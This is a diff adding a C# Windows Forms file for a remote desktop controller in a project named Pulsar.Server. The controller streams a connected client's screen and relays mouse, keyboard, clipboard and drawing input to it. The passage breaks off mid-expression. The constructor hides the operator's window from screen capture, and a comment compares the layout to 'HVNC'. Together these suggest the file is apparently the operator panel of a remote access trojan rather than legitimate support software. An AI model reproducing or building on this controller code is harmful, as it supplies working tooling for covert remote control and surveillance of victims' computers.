@@ -1,0 +1,1287 @@
+﻿using Gma.System.MouseKeyHook;
+using Pulsar.Common.Enums;
+using Pulsar.Common.Messages;
+using Pulsar.Common.Messages.Monitoring.Clipboard;
+using Pulsar.Server.Forms.DarkMode;
+using Pulsar.Server.Forms.RemoteDesktopPopUp;
+using Pulsar.Server.Helper;
+using Pulsar.Server.Messages;
+using Pulsar.Server.Networking;
+using Pulsar.Server.Utilities;
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Drawing;
+using System.IO;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace Pulsar.Server.Forms
+{
+    public partial class FrmRemoteDesktop : Form
+    {
+        /// <summary>
+        /// States whether remote mouse input is enabled.
+        /// </summary>
+        private bool _enableMouseInput;
+
+        /// <summary>
+        /// States whether remote keyboard input is enabled.
+        /// </summary>
+        private bool _enableKeyboardInput;
+
+        /// <summary>
+        /// States whether drawing mode is enabled.
+        /// </summary>
+        private bool _enableDrawingMode;
+
+        /// <summary>
+        /// States whether eraser mode is enabled.
+        /// </summary>
+        private bool _enableEraserMode;
+
+        /// <summary>
+        /// The current stroke width for drawing.
+        /// </summary>
+        private int _strokeWidth = 5;
+
+        /// <summary>
+        /// The current drawing color.
+        /// </summary>
+        private Color _drawingColor = Color.Red;
+
+        /// <summary>
+        /// Keeps track of the previous mouse position for drawing.
+        /// </summary>
+        private Point _previousMousePosition = Point.Empty;
+
+        /// <summary>
+        /// Holds the state of the local keyboard hooks.
+        /// </summary>
+        private IKeyboardMouseEvents _keyboardHook;
+
+        /// <summary>
+        /// Holds the state of the local mouse hooks.
+        /// </summary>
+        private IKeyboardMouseEvents _mouseHook;
+
+        /// <summary>
+        /// A list of pressed keys for synchronization between key down & -up events.
+        /// </summary>
+        private readonly List<Keys> _keysPressed;
+
+        /// <summary>
+        /// Monitors clipboard changes on the server to send to the client
+        /// </summary>
+        private ClipboardMonitor _clipboardMonitor;
+
+        /// <summary>
+        /// States whether bidirectional clipboard sync is enabled
+        /// </summary>
+        private bool _enableBidirectionalClipboard;
+
+        /// <summary>
+        /// The client which can be used for the remote desktop.
+        /// </summary>
+        private readonly Client _connectClient;
+
+        /// <summary>
+        /// The message handler for handling the communication with the client.
+        /// </summary>
+        private readonly RemoteDesktopHandler _remoteDesktopHandler;
+
+        /// <summary>
+        /// Holds the opened remote desktop form for each client.
+        /// </summary>
+        private static readonly Dictionary<Client, FrmRemoteDesktop> OpenedForms = new Dictionary<Client, FrmRemoteDesktop>();
+
+        private bool _useGPU = false;
+
+        private int _sizeFrames = 0; // independent counter for size label updates
+
+        /// <summary>
+        /// Tracks whether input hooks are attached.
+        /// </summary>
+        private bool _inputHooksAttached;
+
+        // Auto-hide logic for the "Show" button
+        private System.Windows.Forms.Timer _showButtonHideTimer;
+        private bool _showButtonVisible = true;
+        private bool _mouseHoveringTopArea = false;
+
+        // Fullscreen state
+        private bool _isFullscreen = false;
+        private Rectangle _restoreBounds;
+        private FormBorderStyle _restoreBorder;
+
+        /// <summary>
+        /// Creates a new remote desktop form for the client or gets the current open form, if there exists one already.
+        /// </summary>
+        /// <param name="client">The client used for the remote desktop form.</param>
+        /// <returns>
+        /// Returns a new remote desktop form for the client if there is none currently open, otherwise creates a new one.
+        /// </returns>
+        public static FrmRemoteDesktop CreateNewOrGetExisting(Client client)
+        {
+            if (OpenedForms.ContainsKey(client))
+            {
+                return OpenedForms[client];
+            }
+            FrmRemoteDesktop r = new FrmRemoteDesktop(client);
+            r.Disposed += (sender, args) => OpenedForms.Remove(client);
+            OpenedForms.Add(client, r);
+            return r;
+        }
+
+        /// <summary>
+        /// Initializes a new instance of the <see cref="FrmRemoteDesktop"/> class using the given client.
+        /// </summary>
+        /// <param name="client">The client used for the remote desktop form.</param>
+        public FrmRemoteDesktop(Client client)
+        {
+            _connectClient = client;
+            _remoteDesktopHandler = new RemoteDesktopHandler(client);
+            _keysPressed = new List<Keys>();
+            _clipboardMonitor = new ClipboardMonitor(client);
+
+            RegisterMessageHandler();
+            try
+            {
+                InitializeComponent();
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"FrmRemoteDesktop.InitializeComponent failed: {ex}");
+                MessageBox.Show(
+                    $"Failed to initialize Remote Desktop form.\n\n{ex}",
+                    "Remote Desktop Error",
+                    MessageBoxButtons.OK,
+                    MessageBoxIcon.Error);
+                throw;
+            }
+
+            // Ensure correct docking so picDesktop never draws behind panels:
+            // panelTop and panelDrawingTools dock top, picDesktop fills remaining area.
+            panelTop.Dock = DockStyle.Top;
+            panelDrawingTools.Dock = DockStyle.Top;
+            picDesktop.Dock = DockStyle.Fill;
+
+            // Apply dark mode and screen capture protection
+            DarkModeManager.ApplyDarkMode(this);
+            ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
+
+            // Configure color picker and drawing buttons
+            colorPicker.BackColor = _drawingColor;
+            colorPicker.FlatStyle = FlatStyle.Flat;
+            colorPicker.FlatAppearance.BorderColor = Color.White;
+            colorPicker.Text = "Color";
+            colorPicker.ForeColor = Color.White;
+
+            ConfigureDrawingButtons();
+
+            btnShowDrawingTools.Enabled = false;
+
+            strokeWidthTrackBar.Value = _strokeWidth;
+            strokeWidthTrackBar.ValueChanged += strokeWidthTrackBar_ValueChanged;
+            colorPicker.Click += colorPicker_Click;
+
+            // Update tooltip text for bidirectional clipboard
+            toolTipButtons.SetToolTip(this.btnBiDirectionalClipboard, "Enable bidirectional clipboard sync");
+
+            // Hook resize to keep layout correct
+            this.Resize += FrmRemoteDesktop_Resize;
+
+            // Auto-hide timer for the "Show" button
+            _showButtonHideTimer = new System.Windows.Forms.Timer();
+            _showButtonHideTimer.Interval = 2500; // 2.5 seconds
+            _showButtonHideTimer.Tick += (s, e) =>
+            {
+                if (!_mouseHoveringTopArea)
+                    HideShowButton();
+            };
+
+            // Track mouse movement over key areas to bring back the Show button when hovering top
+            this.MouseMove += Frm_MouseMove;
+            picDesktop.MouseMove += Frm_MouseMove;
+            panelTop.MouseMove += Frm_MouseMove;
+            panelDrawingTools.MouseMove += Frm_MouseMove;
+        }
+
+        /// <summary>
+        /// Configures the drawing tool buttons with the correct styling and icons
+        /// </summary>
+        private void ConfigureDrawingButtons()
+        {
+            // pencil
+            btnDrawing.Size = new Size(60, 28);
+            btnDrawing.FlatStyle = FlatStyle.Flat;
+            btnDrawing.FlatAppearance.BorderSize = 1;
+            btnDrawing.BackgroundImage = Properties.Resources.pencil;
+            btnDrawing.BackgroundImageLayout = ImageLayout.Zoom;
+            btnDrawing.Text = string.Empty;
+            btnDrawing.BackColor = SystemColors.Control;
+            btnDrawing.UseVisualStyleBackColor = false;
+            toolTipButtons.SetToolTip(btnDrawing, "Enable drawing");
+
+            // eraser
+            btnEraser.Size = new Size(60, 28);
+            btnEraser.FlatStyle = FlatStyle.Flat;
+            btnEraser.FlatAppearance.BorderSize = 1;
+            btnEraser.BackgroundImage = Properties.Resources.eraser;
+            btnEraser.BackgroundImageLayout = ImageLayout.Zoom;
+            btnEraser.Text = string.Empty;
+            btnEraser.BackColor = SystemColors.Control;
+            btnEraser.UseVisualStyleBackColor = false;
+            toolTipButtons.SetToolTip(btnEraser, "Enable eraser");
+
+            // clear
+            btnClearDrawing.Size = new Size(60, 28);
+            btnClearDrawing.FlatStyle = FlatStyle.Flat;
+            btnClearDrawing.FlatAppearance.BorderSize = 1;
+            btnClearDrawing.BackgroundImage = Properties.Resources.clear;
+            btnClearDrawing.BackgroundImageLayout = ImageLayout.Zoom;
+            btnClearDrawing.Text = string.Empty;
+            btnClearDrawing.BackColor = SystemColors.Control;
+            btnClearDrawing.UseVisualStyleBackColor = false;
+            toolTipButtons.SetToolTip(btnClearDrawing, "Clear drawing");
+        }
+
+        /// <summary>
+        /// Called whenever a client disconnects.
+        /// </summary>
+        /// <param name="client">The client which disconnected.</param>
+        /// <param name="connected">True if the client connected, false if disconnected</param>
+        private void ClientDisconnected(Client client, bool connected)
+        {
+            if (connected) return;
+
+            if (IsDisposed || !IsHandleCreated)
+                return;
+
+            try
+            {
+                BeginInvoke((MethodInvoker)(() =>
+                {
+                    if (!IsDisposed)
+                        Close();
+                }));
+            }
+            catch (ObjectDisposedException) { }
+        }
+
+
+        /// <summary>
+        /// Registers the remote desktop message handler for client communication.
+        /// </summary>
+        private void RegisterMessageHandler()
+        {
+            _connectClient.ClientState += ClientDisconnected;
+            _remoteDesktopHandler.DisplaysChanged += DisplaysChanged;
+            _remoteDesktopHandler.ProgressChanged += UpdateImage;
+            MessageHandler.Register(_remoteDesktopHandler);
+        }
+
+        /// <summary>
+        /// Unregisters the remote desktop message handler.
+        /// </summary>
+        private void UnregisterMessageHandler()
+        {
+            MessageHandler.Unregister(_remoteDesktopHandler);
+            _remoteDesktopHandler.DisplaysChanged -= DisplaysChanged;
+            _remoteDesktopHandler.ProgressChanged -= UpdateImage;
+            _connectClient.ClientState -= ClientDisconnected;
+        }
+
+        private void SubscribeEvents()
+        {
+            if (_inputHooksAttached)
+                return;
+
+            try
+            {
+                _keyboardHook = Hook.GlobalEvents();
+                _keyboardHook.KeyDown += OnKeyDown;
+                _keyboardHook.KeyUp += OnKeyUp;
+
+                _mouseHook = Hook.AppEvents();
+                _mouseHook.MouseWheel += OnMouseWheelMove;
+
+                _inputHooksAttached = true;
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"SubscribeEvents failed: {ex}");
+                _inputHooksAttached = false;
+            }
+        }
+
+        private void UnsubscribeEvents()
+        {
+            if (!_inputHooksAttached)
+                return;
+
+            try
+            {
+                if (_keyboardHook != null)
+                {
+                    _keyboardHook.KeyDown -= OnKeyDown;
+                    _keyboardHook.KeyUp -= OnKeyUp;
+                    _keyboardHook.Dispose();
+                    _keyboardHook = null;
+                }
+
+                if (_mouseHook != null)
+                {
+                    _mouseHook.MouseWheel -= OnMouseWheelMove;
+                    _mouseHook.Dispose();
+                    _mouseHook = null;
+                }
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"UnsubscribeEvents failed: {ex}");
+            }
+            finally
+            {
+                _inputHooksAttached = false;
+            }
+        }
+
+
+        // =========================
+        //  START STREAM (FIXED)
+        // =========================
+        private void StartStream(bool useGpu)
+        {
+            // --- UI state ---
+            btnStart.Enabled = false;
+            btnStop.Enabled = true;
+            ToggleConfigurationControls(true);
+
+            // --- Ensure only one image handler ---
+            _remoteDesktopHandler.ProgressChanged -= UpdateImage;
+            _remoteDesktopHandler.ProgressChanged += UpdateImage;
+
+            // --- FPS EVENT FIX (always reattach before Start) ---
+            try { picDesktop.UnsetFrameUpdatedEvent(frameCounter_FrameUpdated); } catch { }
+            try
+            {
+                picDesktop.SetFrameUpdatedEvent(frameCounter_FrameUpdated);
+                Debug.WriteLine("FPS event attached (initial).");
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Failed to attach FPS event: {ex}");
+            }
+
+            // --- Reset counters ---
+            _sizeFrames = 0;
+            _previousMousePosition = Point.Empty;
+
+            // --- Start rendering control ---
+            picDesktop.Start();
+            picDesktop.Enabled = true;
+
+            // --- Tell client to begin streaming frames ---
+            try
+            {
+                _remoteDesktopHandler.BeginReceiveFrames(
+                    barQuality.Value,
+                    cbMonitors.SelectedIndex,
+                    useGpu);
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"BeginReceiveFrames failed: {ex}");
+                throw; // handled in btnStart_Click
+            }
+
+            // --- SAFETY: some GPUs / first-frame delays detach events ---
+            Task.Delay(150).ContinueWith(_ =>
+            {
+                if (IsDisposed || !IsHandleCreated) return;
+
+                try
+                {
+                    BeginInvoke(new MethodInvoker(() =>
+                    {
+                        try { picDesktop.UnsetFrameUpdatedEvent(frameCounter_FrameUpdated); } catch { }
+                        try
+                        {
+                            picDesktop.SetFrameUpdatedEvent(frameCounter_FrameUpdated);
+                            Debug.WriteLine("FPS event attached (delayed).");
+                        }
+                        catch (Exception ex)
+                        {
+                            Debug.WriteLine($"Delayed FPS reattach failed: {ex}");
+                        }
+                    }));
+                }
+                catch { }
+            });
+
+            // Enable drawing toolbar button
+            btnShowDrawingTools.Enabled = true;
+        }
+
+
+
+        // =========================
+        //  STOP STREAM (FIXED)
+        // =========================
+        private void StopStream()
+        {
+            try
+            {
+                ToggleConfigurationControls(false);
+                btnShowDrawingTools.Enabled = false;
+
+                UnsubscribeEvents();
+
+                _remoteDesktopHandler.ProgressChanged -= UpdateImage;
+
+                picDesktop.Stop();
+                picDesktop.UnsetFrameUpdatedEvent(frameCounter_FrameUpdated);
+                picDesktop.UpdateImage(null, true);
+
+                _enableDrawingMode = false;
+                _enableEraserMode = false;
+                _previousMousePosition = Point.Empty;
+
+                ConfigureDrawingButtons();
+                picDesktop.Cursor = Cursors.Default;
+
+                if (panelDrawingTools.Visible)
+                {
+                    panelDrawingTools.Visible = false;
+                    btnShowDrawingTools.Image = Properties.Resources.arrow_up;
+                    toolTipButtons.SetToolTip(btnShowDrawingTools, "Show drawing tools");
+                }
+
+                _remoteDesktopHandler.EndReceiveFrames();
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"StopStream error: {ex}");
+            }
+            finally
+            {
+                btnStart.Enabled = true;
+                btnStop.Enabled = false;
+                GC.Collect();
+                GC.WaitForPendingFinalizers();
+            }
+        }
+
+
+        /// <summary>
+        /// Toggles the activatability of configuration controls in the status/configuration panel.
+        /// </summary>
+        /// <param name="started">When set to <code>true</code> the configuration controls get enabled, otherwise they get disabled.</param>
+        private void ToggleConfigurationControls(bool started)
+        {
+            btnStart.Enabled = !started;
+            btnStop.Enabled = started;
+            barQuality.Enabled = !started;
+            cbMonitors.Enabled = !started;
+        }
+
+        /// <summary>
+        /// Toggles the visibility of the status/configuration panel.
+        /// </summary>
+        /// <param name="visible">Decides if the panel should be visible.</param>
+        private void TogglePanelVisibility(bool visible)
+        {
+            panelTop.Visible = visible;
+            btnShow.Visible = !visible;
+
+            _showButtonVisible = !visible;
+
+            // Ensure panels are on top and layout is recalculated so picDesktop fills only the remaining area
+            UpdateDesktopLayout();
+            PositionShowButtonTopCenter();
+
+            if (visible)
+            {
+                // Panel visible -> no show button, no timer
+                _showButtonHideTimer.Stop();
+                btnShow.Visible = false;
+                _showButtonVisible = false;
+            }
+            else
+            {
+                // Panel hidden -> show button briefly, then auto-hide
+                btnShow.Visible = true;
+                _showButtonVisible = true;
+                _showButtonHideTimer.Stop();
+                _showButtonHideTimer.Start();
+            }
+
+            this.ActiveControl = picDesktop;
+        }
+
+        /// <summary>
+        /// Called whenever the remote displays changed.
+        /// </summary>
+        /// <param name="sender">The message handler which raised the event.</param>
+        /// <param name="displays">The currently available displays.</param>
+        private void DisplaysChanged(object sender, int displays)
+        {
+            if (IsDisposed || !IsHandleCreated)
+                return;
+
+            if (InvokeRequired)
+            {
+                try
+                {
+                    BeginInvoke(new Action<object, int>(DisplaysChanged), sender, displays);
+                }
+                catch (ObjectDisposedException) { }
+                return;
+            }
+
+            cbMonitors.Items.Clear();
+            for (int i = 0; i < displays; i++)
+                cbMonitors.Items.Add($"Display {i + 1}");
+            if (cbMonitors.Items.Count > 0)
+                cbMonitors.SelectedIndex = 0;
+        }
+
+
+        private void UpdateImage(object sender, Bitmap bmp)
+        {
+            if (IsDisposed || !IsHandleCreated)
+                return;
+
+            if (InvokeRequired)
+            {
+                try
+                {
+                    BeginInvoke(new Action<object, Bitmap>(UpdateImage), sender, bmp);
+                }
+                catch (ObjectDisposedException) { }
+                return;
+            }
+
+            _sizeFrames++;
+            if (_sizeFrames >= 60)
+            {
+                _sizeFrames = 0;
+                long last = _remoteDesktopHandler.LastFrameSizeBytes;
+                double avg = _remoteDesktopHandler.AverageFrameSizeBytes;
+                if (last > 0 || avg > 0)
+                {
+                    double avgKB = avg / 1024.0;
+                    sizeLabelCounter.Text = $"{avgKB:0.0}  KB";
+                }
+            }
+
+            picDesktop.UpdateImage(bmp, false);
+        }
+
+        private void FrmRemoteDesktop_Load(object sender, EventArgs e)
+        {
+            this.Text = WindowHelper.GetWindowTitle("Remote Desktop", _connectClient);
+
+            OnResize(EventArgs.Empty); // trigger resize event to align controls
+
+            panelDrawingTools.Visible = false;
+            btnShowDrawingTools.Image = Properties.Resources.arrow_up;
+            toolTipButtons.SetToolTip(btnShowDrawingTools, "Show drawing tools");
+
+            _enableDrawingMode = false;
+            _enableEraserMode = false;
+
+            ConfigureDrawingButtons();
+
+            // Important: ensure initial layout is correct so picDesktop isn't behind panels
+            UpdateDesktopLayout();
+
+            _remoteDesktopHandler.RefreshDisplays();
+
+            PositionShowButtonTopCenter();
+        }
+
+        /// <summary>
+        /// Updates the title with the current frames per second.
+        /// </summary>
+        /// <param name="e">The new frames per second.</param>
+        private void frameCounter_FrameUpdated(FrameUpdatedEventArgs e)
+        {
+            float fpsToShow = _remoteDesktopHandler.CurrentFps > 0 ? _remoteDesktopHandler.CurrentFps : e.CurrentFramesPerSecond;
+            this.Text = string.Format("{0} - FPS: {1}", WindowHelper.GetWindowTitle("Remote Desktop", _connectClient), fpsToShow.ToString("0.00"));
+        }
+
+        private void FrmRemoteDesktop_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            // all cleanup logic goes here
+            SetClientClipboardSync(enabled: false);
+            UnsubscribeEvents();
+            if (_remoteDesktopHandler.IsStarted) StopStream();
+            UnregisterMessageHandler();
+            _remoteDesktopHandler.Dispose();
+            _clipboardMonitor?.Dispose();
+
+            if (_showButtonHideTimer != null)
+            {
+                _showButtonHideTimer.Stop();
+                _showButtonHideTimer.Dispose();
+            }
+        }
+
+        private void FrmRemoteDesktop_Resize(object sender, EventArgs e)
+        {
+            if (WindowState == FormWindowState.Minimized)
+                return;
+
+            UpdateDesktopLayout();
+            _remoteDesktopHandler.LocalResolution = picDesktop.ClientSize;
+
+            PositionShowButtonTopCenter();
+        }
+
+        private void PositionShowButtonTopCenter()
+        {
+            btnShow.Left = (ClientSize.Width - btnShow.Width) / 2;
+            btnShow.Top = 10; // same as HVNC
+        }
+
+
+        /// <summary>
+        /// Centralized layout update that ensures picDesktop fills only the visible client area
+        /// and the top panels are on top (not overlapped by picDesktop).
+        /// Call this after showing/hiding panels or on resize.
+        /// </summary>
+        private void UpdateDesktopLayout()
+        {
+            // Reset docking first to avoid layout conflicts
+            picDesktop.Dock = DockStyle.None;
+
+            // Start from top of the form
+            int yOffset = 0;
+
+            // Add offset for visible panels
+            if (panelTop.Visible)
+                yOffset += panelTop.Height;
+
+            if (panelDrawingTools.Visible)
+                yOffset += panelDrawingTools.Height;
+
+            // Set position and size so picDesktop starts below panels
+            picDesktop.Location = new Point(0, yOffset);
+            picDesktop.Size = new Size(ClientSize.Width, ClientSize.Height - yOffset);
+
+            // Redock to fill the space after manual sizing (forces proper layout)
+            picDesktop.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
+
+            picDesktop.Invalidate();
+        }
+
+        private void btnStart_Click(object sender, EventArgs e)
+        {
+            picDesktop.Enabled = true;
+
+            if (cbMonitors.Items.Count == 0)
+            {
+                MessageBox.Show("No remote display detected.\nPlease wait till the client sends a list with available displays.",
+                    "Starting failed", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                return;
+            }
+
+            try
+            {
+                SubscribeEvents();
+                StartStream(_useGPU);
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"StartStream error: {ex}");
+                MessageBox.Show($"Failed to start Remote Desktop.\n\n{ex.Message}",
+                    "Remote Desktop Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                StopStream(); // cleanup
+            }
+        }
+
+        private void btnStop_Click(object sender, EventArgs e)
+        {
+            picDesktop.Enabled = false;
+            StopStream();
+        }
+
+
+        #region Remote Desktop Input
+
+        private void picDesktop_MouseDown(object sender, MouseEventArgs e)
+        {
+            if (this.ContainsFocus)
+            {
+                if ((_enableDrawingMode || _enableEraserMode) && e.Button == MouseButtons.Left)
+                {
+                    _previousMousePosition = e.Location;
+                }
+                else if (_enableMouseInput && !(_enableDrawingMode || _enableEraserMode))
+                {
+                    MouseAction action = MouseAction.None;
+
+                    if (e.Button == MouseButtons.Left)
+                        action = MouseAction.LeftDown;
+                    if (e.Button == MouseButtons.Right)
+                        action = MouseAction.RightDown;
+
+                    int selectedDisplayIndex = cbMonitors.SelectedIndex;
+
+                    _remoteDesktopHandler.SendMouseEvent(action, true, e.X, e.Y, selectedDisplayIndex);
+                }
+            }
+        }
+
+        private void picDesktop_MouseMove(object sender, MouseEventArgs e)
+        {
+            if (this.ContainsFocus)
+            {
+                if ((_enableDrawingMode || _enableEraserMode) && e.Button == MouseButtons.Left)
+                {
+                    if (_previousMousePosition != Point.Empty &&
+                        (_previousMousePosition.X != e.X || _previousMousePosition.Y != e.Y))
+                    {
+                        int selectedDisplayIndex = cbMonitors.SelectedIndex;
+
+                        bool useEraser = _enableEraserMode;
+
+                        _remoteDesktopHandler.SendDrawingEvent(
+                            e.X, e.Y,
+                            _previousMousePosition.X, _previousMousePosition.Y,
+                            _strokeWidth,
+                            _drawingColor.ToArgb(),
+                            useEraser,
+                            false,
+                            selectedDisplayIndex);
+
+                        _previousMousePosition = e.Location;
+                    }
+                }
+                else if (_enableMouseInput && !(_enableDrawingMode || _enableEraserMode))
+                {
+                    int selectedDisplayIndex = cbMonitors.SelectedIndex;
+
+                    _remoteDesktopHandler.SendMouseEvent(MouseAction.MoveCursor, false, e.X, e.Y, selectedDisplayIndex);
+                }
+            }
+        }
+
+        private void picDesktop_MouseUp(object sender, MouseEventArgs e)
+        {
+            if (this.ContainsFocus)
+            {
+                if ((_enableDrawingMode || _enableEraserMode) && e.Button == MouseButtons.Left)
+                {
+                    _previousMousePosition = Point.Empty;
+                }
+                else if (_enableMouseInput && !(_enableDrawingMode || _enableEraserMode))
+                {
+                    MouseAction action = MouseAction.None;
+
+                    if (e.Button == MouseButtons.Left)
+                        action = MouseAction.LeftUp;
+                    if (e.Button == MouseButtons.Right)
+                        action = MouseAction.RightUp;
+
+                    int selectedDisplayIndex = cbMonitors.SelectedIndex;
+
+                    _remoteDesktopHandler.SendMouseEvent(action, false, e.X, e.Y, selectedDisplayIndex);
+                }
+            }
+        }
+
+        private void OnMouseWheelMove(object sender, MouseEventArgs e)
+        {
+            if (_enableMouseInput && this.ContainsFocus)
+            {
+                _remoteDesktopHandler.SendMouseEvent(e.Delta == 120 ? MouseAction.ScrollUp : MouseAction.ScrollDown,
+                    false, 0, 0, cbMonitors.SelectedIndex);
+            }
+        }
+
+        private void OnKeyDown(object sender, KeyEventArgs e)
+        {
+            if (picDesktop.HasFrame && _enableKeyboardInput && this.ContainsFocus)
+            {
+                if (!IsLockKey(e.KeyCode))
+                    e.Handled = true;
+
+                if (_keysPressed.Contains(e.KeyCode))
+                    return;
+
+                _keysPressed.Add(e.KeyCode);
+
+                _remoteDesktopHandler.SendKeyboardEvent((byte)e.KeyCode, true);
+            }
+        }
+
+        private void OnKeyUp(object sender, KeyEventArgs e)
+        {
+            if (picDesktop.HasFrame && _enableKeyboardInput && this.ContainsFocus)
+            {
+                if (!IsLockKey(e.KeyCode))
+                    e.Handled = true;
+
+                _keysPressed.Remove(e.KeyCode);
+
+                _remoteDesktopHandler.SendKeyboardEvent((byte)e.KeyCode, false);
+            }
+        }
+
+        private bool IsLockKey(Keys key)
+        {
+            return ((key & Keys.CapsLock) == Keys.CapsLock)
+                   || ((key & Keys.NumLock) == Keys.NumLock)
+                   || ((key & Keys.Scroll) == Keys.Scroll);
+        }
+
+        #endregion Remote Desktop Input
+
+        #region Remote Desktop Configuration
+
+        private void barQuality_Scroll(object sender, EventArgs e)
+        {
+            int value = barQuality.Value;
+            lblQualityShow.Text = value.ToString();
+
+            if (value < 25)
+                lblQualityShow.Text += " (low)";
+            else if (value >= 85)
+                lblQualityShow.Text += " (best)";
+            else if (value >= 75)
+                lblQualityShow.Text += " (high)";
+            else if (value >= 25)
+                lblQualityShow.Text += " (mid)";
+
+            this.ActiveControl = picDesktop;
+        }
+
+        private void btnMouse_Click(object sender, EventArgs e)
+        {
+            if (_enableMouseInput)
+            {
+                this.picDesktop.Cursor = Cursors.Default;
+                btnMouse.Image = Properties.Resources.mouse_delete;
+                toolTipButtons.SetToolTip(btnMouse, "Enable mouse input.");
+                _enableMouseInput = false;
+            }
+            else
+            {
+                this.picDesktop.Cursor = Cursors.Hand;
+                btnMouse.Image = Properties.Resources.mouse_add;
+                toolTipButtons.SetToolTip(btnMouse, "Disable mouse input.");
+                _enableMouseInput = true;
+            }
+
+            UpdateInputButtonsVisualState();
+            this.ActiveControl = picDesktop;
+        }
+
+        private void btnKeyboard_Click(object sender, EventArgs e)
+        {
+            if (_enableKeyboardInput)
+            {
+                this.picDesktop.Cursor = Cursors.Default;
+                btnKeyboard.Image = Properties.Resources.keyboard_delete;
+                toolTipButtons.SetToolTip(btnKeyboard, "Enable keyboard input.");
+                _enableKeyboardInput = false;
+            }
+            else
+            {
+                this.picDesktop.Cursor = Cursors.Hand;
+                btnKeyboard.Image = Properties.Resources.keyboard_add;
+                toolTipButtons.SetToolTip(btnKeyboard, "Disable keyboard input.");
+                _enableKeyboardInput = true;
+            }
+
+            UpdateInputButtonsVisualState();
+            this.ActiveControl = picDesktop;
+        }
+
+        private void enableGPU_Click(object sender, EventArgs e)
+        {
+            _useGPU = !_useGPU;
+            if (_useGPU)
+            {
+                enableGPU.Image = Properties.Resources.computer_go; // enable GPU
+                toolTipButtons.SetToolTip(enableGPU, "Disable GPU.");
+            }
+            else
+            {
+                enableGPU.Image = Properties.Resources.computer_error; // disable GPU
+                toolTipButtons.SetToolTip(enableGPU, "Enable GPU.");
+            }
+            UpdateInputButtonsVisualState();
+        }
+
+        private void btnDrawing_Click(object sender, EventArgs e)
+        {
+            if (!_remoteDesktopHandler.IsStarted)
+            {
+                MessageBox.Show("Drawing is only available when Remote Desktop is started",
+                    "Drawing unavailable", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                return;
+            }
+
+            _enableDrawingMode = !_enableDrawingMode;
+
+            if (_enableDrawingMode)
+            {
+                _enableEraserMode = false;
+
+                btnEraser.BackColor = SystemColors.Control;
+                toolTipButtons.SetToolTip(btnEraser, "Enable eraser");
+
+                btnDrawing.BackColor = Color.FromArgb(120, 170, 120);
+                toolTipButtons.SetToolTip(btnDrawing, "Disable drawing");
+                picDesktop.Cursor = Cursors.Cross;
+            }
+            else
+            {
+                btnDrawing.BackColor = SystemColors.Control;
+                toolTipButtons.SetToolTip(btnDrawing, "Enable drawing");
+                picDesktop.Cursor = Cursors.Default;
+            }
+
+            this.ActiveControl = picDesktop;
+        }
+
+        private void btnEraser_Click(object sender, EventArgs e)
+        {
+            if (!_remoteDesktopHandler.IsStarted)
+            {
+                MessageBox.Show("Eraser is only available when Remote Desktop is started",
+                    "Eraser unavailable", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                return;
+            }
+
+            _enableEraserMode = !_enableEraserMode;
+
+            if (_enableEraserMode)
+            {
+                _enableDrawingMode = false;
+
+                btnDrawing.BackColor = SystemColors.Control;
+                toolTipButtons.SetToolTip(btnDrawing, "Enable drawing");
+
+                btnEraser.BackColor = Color.FromArgb(120, 170, 120);
+                toolTipButtons.SetToolTip(btnEraser, "Disable eraser");
+                picDesktop.Cursor = Cursors.Hand;
+            }
+            else
+            {
+                btnEraser.BackColor = SystemColors.Control;
+                toolTipButtons.SetToolTip(btnEraser, "Enable eraser");
+                picDesktop.Cursor = Cursors.Default;
+            }
+
+            this.ActiveControl = picDesktop;
+        }
+
+        private void btnShowDrawingTools_Click(object sender, EventArgs e)
+        {
+            ToggleDrawingPanelVisibility(!panelDrawingTools.Visible);
+        }
+
+        private void ToggleDrawingPanelVisibility(bool visible)
+        {
+            if (visible && !_remoteDesktopHandler.IsStarted)
+            {
+                MessageBox.Show("Drawing tools are only available when Remote Desktop is started",
+                    "Drawing unavailable", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                return;
+            }
+
+            panelDrawingTools.Visible = visible;
+            btnShowDrawingTools.Image = visible ?
+                Properties.Resources.arrow_down :
+                Properties.Resources.arrow_up;
+            toolTipButtons.SetToolTip(btnShowDrawingTools,
+                visible ? "Hide drawing tools" : "Show drawing tools");
+
+            // Recalculate layout so picDesktop fills remaining area and panels stay on top
+            UpdateDesktopLayout();
+
+            this.ActiveControl = picDesktop;
+        }
+
+        private void btnClearDrawing_Click(object sender, EventArgs e)
+        {
+            if (!_remoteDesktopHandler.IsStarted)
+            {
+                MessageBox.Show("Clear drawing is only available when Remote Desktop is started",
+                    "Clear unavailable", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                return;
+            }
+
+            int displayIndex = cbMonitors.SelectedIndex;
+            _remoteDesktopHandler.SendDrawingEvent(0, 0, 0, 0, 0, 0, false, true, displayIndex);
+        }
+
+        private void colorPicker_Click(object sender, EventArgs e)
+        {
+            if (!_remoteDesktopHandler.IsStarted)
+            {
+                MessageBox.Show("Color selection is only available when Remote Desktop is started",
+                    "Color selection unavailable", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                return;
+            }
+
+            ColorDialog colorDialog = new ColorDialog();
+            colorDialog.Color = _drawingColor;
+            colorDialog.AllowFullOpen = true;
+            colorDialog.AnyColor = true;
+
+            if (colorDialog.ShowDialog() == DialogResult.OK)
+            {
+                _drawingColor = colorDialog.Color;
+                colorPicker.BackColor = _drawingColor;
+
+                colorPicker.ForeColor = GetContrastColor(_drawingColor);
+            }
+        }
+
+        private void strokeWidthTrackBar_ValueChanged(object sender, EventArgs e)
+        {
+            _strokeWidth = strokeWidthTrackBar.Value;
+        }
+
+        private Color GetContrastColor(Color color)
+        {
+            int brightness = (int)Math.Sqrt(
